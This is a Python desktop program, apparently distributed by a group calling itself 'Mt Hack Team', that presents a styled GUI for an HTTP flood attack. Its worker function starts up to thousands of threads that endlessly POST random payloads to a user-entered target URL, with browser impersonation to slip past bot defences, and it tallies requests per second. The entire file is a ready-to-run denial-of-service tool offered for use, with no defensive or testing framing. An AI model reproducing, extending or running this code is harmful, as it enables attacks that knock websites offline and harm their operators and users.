import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import random
import time
from datetime import datetime
import webbrowser
from tkinter import font as tkfont
try:
    from curl_cffi import requests
except ImportError:
    messagebox.showerror("Installation Required", "Please install 'curl_cffi' package:\n\npip install curl_cffi")
    exit()

class MtAttackGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("Nower Advanced Attack Tool v3.0")
        self.master.geometry("1000x750")
        self.master.minsize(900, 650)
        self.master.configure(bg="#0c0c0c")
       
        self.title_font = tkfont.Font(family="Consolas", size=24, weight="bold")
        self.subtitle_font = tkfont.Font(family="Segoe UI", size=10)
        self.button_font = tkfont.Font(family="Segoe UI", size=10, weight="bold")
        self.stats_font = tkfont.Font(family="Consolas", size=9)
       
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.configure_styles()
       
        self.running = False
        self.success_count = 0
        self.failed_count = 0
        self.total_requests = 0
        self.start_time = 0
        self.last_request_time = 0
        self.rps_history = []
       
        self.create_header()
        self.create_control_panel()
        self.create_stats_panel()
        self.create_console()
        self.create_footer()
        self.animate_header()
   
    def configure_styles(self):
        """Configure custom widget styles"""
        self.style.configure('TFrame', background='#0c0c0c')
        self.style.configure('TLabel', background='#0c0c0c', foreground='white')
        self.style.configure('TButton', font=self.button_font, padding=6)
        self.style.configure('TEntry', fieldbackground='#1e1e1e', foreground='white')
        self.style.configure('TSpinbox', fieldbackground='#1e1e1e', foreground='white')
        self.style.configure('TProgressbar', thickness=10)
        self.style.configure('Attack.TButton', foreground='white', background='#d32f2f')
        self.style.map('Attack.TButton',
                      background=[('active', '#b71c1c'), ('disabled', '#5d4037')])
        self.style.configure('Stop.TButton', foreground='white', background='#424242')
        self.style.map('Stop.TButton',
                      background=[('active', '#616161'), ('disabled', '#424242')])
        self.style.configure('Console.TFrame', background='#1e1e1e')
   
    def create_header(self):
        """Create the header section with logo and title"""
        self.header_frame = ttk.Frame(self.master, style='TFrame')
        self.header_frame.pack(fill=tk.X, padx=20, pady=(20, 10))
       
        self.logo_canvas = tk.Canvas(self.header_frame, width=60, height=60,
                                    bg='#0c0c0c', highlightthickness=0)
        self.logo_canvas.pack(side=tk.LEFT)
        self.draw_tht_logo()
       
        title_frame = ttk.Frame(self.header_frame, style='TFrame')
        title_frame.pack(side=tk.LEFT, padx=15)
       
        self.title_label = ttk.Label(title_frame, text="NOWER ADVANCED ATTACK TOOL",
                                   font=self.title_font, foreground='#d32f2f')
        self.title_label.pack(anchor='w')
       
        self.subtitle_label = ttk.Label(title_frame, text="Mt Hack Team - Premium Edition",
                                      font=self.subtitle_font, foreground='#757575')
        self.subtitle_label.pack(anchor='w')
       
        version_frame = ttk.Frame(self.header_frame, style='TFrame')
        version_frame.pack(side=tk.RIGHT)
        ttk.Label(version_frame, text="v3.0", font=self.subtitle_font,
                 foreground='#616161').pack(anchor='e')
   
    def draw_tht_logo(self):
        """Draw THT logo on canvas"""
        self.logo_canvas.delete("all")
        self.logo_canvas.create_oval(5, 5, 55, 55, fill='#d32f2f', outline='')
        self.logo_canvas.create_text(30, 30, text="MT",
                                   font=("Consolas", 16, "bold"),
                                   fill="white")
   
    def create_control_panel(self):
        """Create attack control panel"""
        control_frame = ttk.LabelFrame(self.master, text=" ATTACK CONTROLS ",
                                     padding=(20, 10), style='TFrame')
        control_frame.pack(fill=tk.X, padx=20, pady=10)
       
        ttk.Label(control_frame, text="Target URL:").grid(row=0, column=0, sticky='w', pady=(0, 5))
        self.url_entry = ttk.Entry(control_frame, width=60)
        self.url_entry.grid(row=1, column=0, columnspan=3, sticky='ew', pady=(0, 15))
       
        ttk.Label(control_frame, text="Threads:").grid(row=2, column=0, sticky='w', pady=(0, 5))
        self.threads_spin = ttk.Spinbox(control_frame, from_=100, to=10000, increment=100)
        self.threads_spin.grid(row=3, column=0, sticky='w', pady=(0, 15))
        self.threads_spin.set("1000")
       
        ttk.Label(control_frame, text="Timeout (s):").grid(row=2, column=1, sticky='w', padx=10, pady=(0, 5))
        self.timeout_spin = ttk.Spinbox(control_frame, from_=1, to=60, increment=1)
        self.timeout_spin.grid(row=3, column=1, sticky='w', padx=10, pady=(0, 15))
        self.timeout_spin.set("10")
       

        button_frame = ttk.Frame(control_frame, style='TFrame')
        button_frame.grid(row=4, column=0, columnspan=3, pady=(10, 0))
       
        self.start_btn = ttk.Button(button_frame, text="START ATTACK",
                                  style='Attack.TButton', command=self.start_attack)
        self.start_btn.pack(side=tk.LEFT, padx=5)
       
        self.stop_btn = ttk.Button(button_frame, text="STOP",
                                 style='Stop.TButton', command=self.stop_attack, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
       
        control_frame.columnconfigure(2, weight=1)
   
    def create_stats_panel(self):
        """Create statistics display panel"""
        stats_frame = ttk.LabelFrame(self.master, text=" ATTACK STATISTICS ",
                                   padding=(20, 15), style='TFrame')
        stats_frame.pack(fill=tk.BOTH, padx=20, pady=10, expand=True)
       
        self.progress_bar = ttk.Progressbar(stats_frame, mode='determinate', length=100)
        self.progress_bar.pack(fill=tk.X, pady=(0, 15))
       
        stats_grid = ttk.Frame(stats_frame, style='TFrame')
        stats_grid.pack(fill=tk.BOTH, expand=True)
       
        ttk.Label(stats_grid, text="Elapsed Time:", font=self.stats_font).grid(row=0, column=0, sticky='w')
        self.time_label = ttk.Label(stats_grid, text="00:00:00", font=self.stats_font, foreground='#4caf50')
        self.time_label.grid(row=0, column=1, sticky='w', padx=(0, 30))
       
        ttk.Label(stats_grid, text="Success:", font=self.stats_font).grid(row=1, column=0, sticky='w')
        self.success_label = ttk.Label(stats_grid, text="0", font=self.stats_font, foreground='#4caf50')
        self.success_label.grid(row=1, column=1, sticky='w', padx=(0, 30))
       
        ttk.Label(stats_grid, text="Payload Size:", font=self.stats_font).grid(row=2, column=0, sticky='w')
        self.payload_label = ttk.Label(stats_grid, text="512 bytes", font=self.stats_font)
        self.payload_label.grid(row=2, column=1, sticky='w', padx=(0, 30))
       
        ttk.Label(stats_grid, text="Requests/s:", font=self.stats_font).grid(row=0, column=2, sticky='w')
        self.rps_label = ttk.Label(stats_grid, text="0", font=self.stats_font, foreground='#ff9800')
        self.rps_label.grid(row=0, column=3, sticky='w')
       
        ttk.Label(stats_grid, text="Failed:", font=self.stats_font).grid(row=1, column=2, sticky='w')
        self.failed_label = ttk.Label(stats_grid, text="0", font=self.stats_font, foreground='#f44336')
        self.failed_label.grid(row=1, column=3, sticky='w')
       
        ttk.Label(stats_grid, text="Total Requests:", font=self.stats_font).grid(row=2, column=2, sticky='w')
        self.total_label = ttk.Label(stats_grid, text="0", font=self.stats_font)
        self.total_label.grid(row=2, column=3, sticky='w')
       
        stats_grid.columnconfigure(1, weight=1)
        stats_grid.columnconfigure(3, weight=1)
   
    def create_console(self):
        """Create console output panel"""
        console_frame = ttk.LabelFrame(self.master, text=" CONSOLE OUTPUT ",
                                     padding=(10, 5), style='Console.TFrame')
        console_frame.pack(fill=tk.BOTH, padx=20, pady=(0, 10), expand=True)
       
        self.console = scrolledtext.ScrolledText(
            console_frame,
            bg='#1e1e1e',
            fg='#e0e0e0',
            insertbackground='white',
            font=('Consolas', 9),
            wrap=tk.WORD,
            padx=10,
            pady=10
        )
        self.console.pack(fill=tk.BOTH, expand=True)
        self.console.configure(state='disabled')
   
    def create_footer(self):
        """Create footer with status and links"""
        footer_frame = ttk.Frame(self.master, style='TFrame')
        footer_frame.pack(fill=tk.X, padx=20, pady=(0, 20))
       
        self.status_label = ttk.Label(footer_frame, text="Ready", foreground='#9e9e9e')
        self.status_label.pack(side=tk.LEFT)
       
        link_frame = ttk.Frame(footer_frame, style='TFrame')
        link_frame.pack(side=tk.RIGHT)
       
        tht_link = ttk.Label(link_frame, text="MT", foreground='#2196f3', cursor="hand2")
        tht_link.pack(side=tk.LEFT)
        tht_link.bind("<Button-1>", lambda e: webbrowser.open("https://t.me/mthackteam"))
       
        ttk.Label(link_frame, text=" | ").pack(side=tk.LEFT)
       
        docs_link = ttk.Label(link_frame, text="Documentation", foreground='#2196f3', cursor="hand2")
        docs_link.pack(side=tk.LEFT)
        docs_link.bind("<Button-1>", lambda e: webbrowser.open("https://t.me/mt_nower"))
   
    def animate_header(self):
        """Animate the header for visual effect"""
        colors = ['#d32f2f', '#f44336', '#e53935', '#c62828']
        current_color = 0
       
        def update_color():
            nonlocal current_color
            self.title_label.config(foreground=colors[current_color])
            self.draw_tht_logo()
            current_color = (current_color + 1) % len(colors)
            self.master.after(500, update_color)
       
        update_color()
   
    def log_message(self, message, level="info"):
        """Add message to console with colored level"""
        self.console.configure(state='normal')
       
        if level == "error":
            color = "#f44336"
        elif level == "warning":
            color = "#ff9800"
        elif level == "success":
            color = "#4caf50"
        else:  # info
            color = "#2196f3"
       
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.insert(tk.END, f"[{timestamp}] ", "timestamp")
        self.console.insert(tk.END, f"{level.upper()}: ", level)
        self.console.insert(tk.END, f"{message}\n")
       
        self.console.configure(state='disabled')
        self.console.see(tk.END)
   
    def start_attack(self):
        """Start the attack with current parameters"""
        target_url = self.url_entry.get()
        if not target_url:
            messagebox.showerror("Error", "Please enter a target URL")
            return
       
        try:
            threads = int(self.threads_spin.get())
            timeout = int(self.timeout_spin.get())
        except ValueError:
            messagebox.showerror("Error", "Invalid numeric value in threads or timeout")
            return
       
        self.running = True
        self.success_count = 0
        self.failed_count = 0
        self.total_requests = 0
        self.start_time = time.time()
        self.last_request_time = time.time()
        self.rps_history = []
       
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.status_label.config(text="Attack in progress...", foreground='#ff9800')
        self.progress_bar['value'] = 0
       
        self.log_message(f"Starting attack on {target_url} with {threads} threads")
        self.log_message(f"Request timeout set to {timeout} seconds")
       
        for i in range(threads):
            thread = threading.Thread(target=self.attack_worker, args=(target_url, timeout), daemon=True)
            thread.start()
       
        self.update_stats()
   
    def stop_attack(self):
        """Stop the current attack"""
        self.running = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status_label.config(text="Attack stopped", foreground='#f44336')
       
        elapsed = time.time() - self.start_time
        avg_rps = self.total_requests / elapsed if elapsed > 0 else 0
        success_rate = (self.success_count / self.total_requests * 100) if self.total_requests > 0 else 0
       
        self.log_message(f"Attack stopped after {elapsed:.1f} seconds", "warning")
        self.log_message(f"Total requests: {self.total_requests}", "info")
        self.log_message(f"Success rate: {success_rate:.1f}%", "success")
        self.log_message(f"Average RPS: {avg_rps:.1f}", "info")
   
    def attack_worker(self, target_url, timeout):
        """Worker thread that sends requests"""
        session = requests.Session()
       
        while self.running:
            try:
                payload = ''.join(random.choices(
                    'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
                    k=512
                ))
               
                response = session.post(
                    target_url,
                    impersonate="chrome110",
                    data={'payload': payload},
                    timeout=timeout
                )
                response.raise_for_status()
               
                with threading.Lock():
                    self.success_count += 1
                    self.total_requests += 1
                    self.last_request_time = time.time()
           
            except Exception as e:
                with threading.Lock():
                    self.failed_count += 1
                    self.total_requests += 1
   
    def update_stats(self):
        """Update the statistics display"""
        if not self.running:
            return
       
        elapsed = time.time() - self.start_time
        self.time_label.config(text=time.strftime('%H:%M:%S', time.gmtime(elapsed)))
       
        current_rps = 0
        if elapsed > 0:
            current_rps = self.total_requests / elapsed
       
        self.rps_label.config(text=f"{current_rps:.1f}")
        self.rps_history.append(current_rps)
        if len(self.rps_history) > 60:
            self.rps_history.pop(0)
       
        self.success_label.config(text=str(self.success_count))
        self.failed_label.config(text=str(self.failed_count))
        self.total_label.config(text=str(self.total_requests))
       
       
        progress = (elapsed % 60) / 60 * 100
        self.progress_bar['value'] = progress
       
       
        self.master.after(1000, self.update_stats)

if __name__ == "__main__":
    root = tk.Tk()
    app = MtAttackGUI(root)
    root.mainloop()